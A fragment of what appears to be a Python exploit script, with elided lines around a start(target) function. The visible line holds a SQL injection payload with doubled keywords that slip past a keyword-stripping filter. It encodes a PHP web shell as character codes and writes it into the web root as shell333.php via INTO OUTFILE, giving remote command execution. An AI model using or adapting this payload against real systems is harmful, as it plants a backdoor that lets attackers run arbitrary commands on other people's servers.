...
def start(target):
    ...
    payload = "admin' uni union on selselectect null,null,null,null,char(60, 63, 112, 104, 112, 32, 115, 121, 115, 116, 101, 109, 40, 36, 95, 80, 79, 83, 84, 91, 99, 109, 100, 93, 41, 59, 63, 62)  in into  outoutfilefile '/var/www/html/shell333.php'#"
